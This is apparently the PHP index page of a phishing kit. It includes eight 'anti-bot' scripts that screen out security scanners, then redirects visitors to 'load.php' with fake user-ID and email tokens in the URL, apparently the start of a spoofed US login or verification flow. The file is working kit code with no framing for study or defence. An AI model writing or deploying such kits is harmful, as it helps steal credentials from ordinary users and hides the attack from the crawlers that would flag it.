<?php
include 'bots/anti1.php';
include 'bots/anti2.php';
include 'bots/anti3.php';
include 'bots/anti4.php';
include 'bots/anti5.php';
include 'bots/anti6.php';
include 'bots/anti7.php';
include 'bots/anti8.php';
$src="load.php?home-US-userID887454686437748135480870230574184864-Email-8869711234348463541898645784-second";
header("location:$src");
?>